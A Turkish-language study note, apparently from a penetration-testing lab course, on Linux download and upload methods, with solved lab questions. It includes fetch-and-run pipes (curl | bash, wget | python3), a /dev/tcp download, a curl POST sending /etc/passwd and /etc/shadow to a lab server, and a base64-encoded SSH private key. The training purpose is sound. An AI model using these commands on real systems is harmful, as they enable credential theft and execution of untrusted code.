---
glightbox: true
icon: material/help
---

# Linux File Transfer Methods

## Download Operations

### Base64 Encoding / Decoding

Dosya transferi gerçekleştirileceği zaman, aktarmak istediğimiz dosya boyutuna göre ağ iletişimi gerektirmeyen yöntemler kullanılabilir. Örneğin bir dosyayı Base64 olarak kodlayabilir ve içeriğini terminale kopyalayabiliriz.

Linux makinesinde bulunan bir SSH anahtarını başka bir Linux makinesine kopyalamak isteyelim. Öncelikle anahtar dosyasını Base64 ile kodlayalım:

```bash
cat id_rsa | base64 -w 0; echo
```

```text title="Output"
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

Çıktıda elde edilen bu string, diğer Linux makinesinde Bash yardımıyla kodu çözüldükten sonra dosya olarak kaydedilebilir:

```bash
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

Son olarak her iki Linux makinesinde bulunan `id_rsa` dosyalarının MD5 çıktılarını kontrol edebiliriz. İki çıktı da aynı ise kopyalama başarılı olmuştur.

Linux makinesinde MD5 hash elde etmek için aşağıdaki komut kullanılabilir:

```bash
md5sum id_rsa
```

```text title="Output"
4e301756a07ded0a2dd6953abf015278  id_rsa
```

### Download a File Using wget

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

### Download a File Using cURL

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Fileless Download with cURL

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Fileless Download with wget

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

Verilen `-qO-` seçeneği `-q -O -` olarak da girilebilir. Burada `-O -` seçeneği çıktının STDOUT üzerine yazılmasını sağlar.

### Download with Bash (/dev/tcp)

Bilinen dosya aktarma araçlarının hiçbirinin kullanılamadığı durumlar olabilir. Bash 2.04 veya üstü sürümü kurulu olduğu sürece (`--enable-net-redirections` ile derlenmiş), yerleşik [/dev/tcp](https://w0lfram1te.com/exploring-dev-tcp) aygıt dosyası basit dosya indirmeleri için kullanılabilir.

Aşağıda verilen komut `/dev/tcp` dosyasını ve buna karşılık gelen TCP soketini okuma/yazma modunda açar (`<>`) ve dosya tanımlayıcısı olarak 3 sayısını atar:

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

Ardından aşağıdaki komut ile bir HTTP GET isteği gerçekleştirilebilir:

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
```

Son olarak aşağıdaki komut ile yanıt görüntülenebilir:

```bash
cat <&3
```

### SSH Downloads

SSH uygulaması, uzaktan dosya aktarımı için varsayılan olarak SSH protokolünü kullanan bir SCP (Secure Copy) yardımcı programıyla birlikte gelir.

Dosya indirmeye başlamadan önce SSH sunucusu kurulmalıdır:

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

Aşağıdaki komut ile SSH bağlantılarını dinleyen port kontrol edilebilir:

```bash
netstat -lnpt
```

```text title="Output"
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
```

SCP ile dosya indirmek için aşağıdaki komut kullanılabilir:

```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```

## Upload Operations

İndirme işlemleri için kullandığımız yöntemlerin aynısını yüklemeler için de kullanabiliriz.

### Web Upload

Yapmamız gereken ilk şey [uploadserver](https://github.com/Densaugeo/uploadserver) modülünü kurmak olmalıdır:

```bash
sudo python3 -m pip install --user uploadserver
```

Bu işlemin ardından bir sertifika oluşturulmalıdır. Bu örnekte kendinden imzalı bir sertifika oluşturulacaktır:

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

Web sunucusu sertifikayı barındırmamalıdır. Web sunucusunda dosyayı barındırmak üzere yeni bir dizin oluşturulması önerilir:

```bash
mkdir https
cd https
```

Ardından sunucuyu başlatabiliriz:

```bash
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```

Aşağıdaki örnekte `/etc/passwd` ve `/etc/shadow` dosyaları sunucuya yüklenmiştir:

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Güvendiğimiz, kendinden imzalı bir sertifika kullandığımız için `--insecure` seçeneğini kullandık.

### Alternative Web File Transfer Method

Python 3 ile basit bir web sunucusu oluşturmak için aşağıdaki komut kullanılabilir:

```bash
python3 -m http.server
```

Python 2.7 ile basit bir web sunucusu oluşturmak için aşağıdaki komut kullanılabilir:

```bash
python2.7 -m SimpleHTTPServer
```

PHP ile basit bir web sunucusu oluşturmak için aşağıdaki komut kullanılabilir:

```bash
php -S 0.0.0.0:8000
```

Ruby ile basit bir web sunucusu oluşturmak için aşağıdaki komut kullanılabilir:

```bash
ruby -run -ehttpd . -p 8000
```

Hedef makineden dosya indirmek için Wget kullanılabilir:

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

### SCP Upload

```bash
scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```

## Questions

```text
Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.
```

??? tip "Steps"

    ```bash
    wget -q -O - 10.129.25.41/flag.txt
    ```

```text
Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, extract the file, and run "hasher <extracted file>" from the command line. Submit the generated hash as your answer.
```

??? tip "Steps"

    Soruda verilen dosyayı Base64 ile kodla:

    ```bash
    base64 -w 0 upload_nix.zip
    ```

    ```text title="Output"
    UEsDBAoAAAAAAEqEKVFRlJcKIAAAACAAAAAOAAAAdXBsb2FkX25peC50eHQwNDgwOTBiYzdlZDA0Zjc1ODY1ODk3NWRmOGY4NjJjOFBLAQI/AAoAAAAAAEqEKVFRlJcKIAAAACAAAAAOACQAAAAAAAAAIAAAAAAAAAB1cGxvYWRfbml4LnR4dAoAIAAAAAAAAQAYAHGdOpjohtYB0cK75fqG1gHXv2od5obWAVBLBQYAAAAAAQABAGAAAABMAAAAAAA=
    ```

    Aşağıdaki komut ile hedefe SSH bağlantısı gerçekleştir:

    ```bash
    ssh htb-student@10.129.25.41
    ```

    Bu Linux makinesine bağlandıktan sonra Bash ile aşağıdaki komutu çalıştır:

    ```bash
    echo -n 'UEsDBAoAAAAAAEqEKVFRlJcKIAAAACAAAAAOAAAAdXBsb2FkX25peC50eHQwNDgwOTBiYzdlZDA0Zjc1ODY1ODk3NWRmOGY4NjJjOFBLAQI/AAoAAAAAAEqEKVFRlJcKIAAAACAAAAAOACQAAAAAAAAAIAAAAAAAAAB1cGxvYWRfbml4LnR4dAoAIAAAAAAAAQAYAHGdOpjohtYB0cK75fqG1gHXv2od5obWAVBLBQYAAAAAAQABAGAAAABMAAAAAAA=' | base64 -d > upload_nix.zip
    ```

    Oluşturulan arşiv içindeki metin dosyasını arşivden çıkarmalıyız. Hedef sistemde `unzip` aracı yüklü olmayabilir. Bu durumda Python kullanabiliriz:

    ```bash
    python3 -c 'import sys; import zipfile; zipfile.PyZipFile("upload_nix.zip").extractall()'
    ```

    Aşağıdaki komutu çalıştır:

    ```bash
    hasher "upload_nix.txt"
    ```

    Çıktıda görülen hash cevap olarak kullanılacaktır.
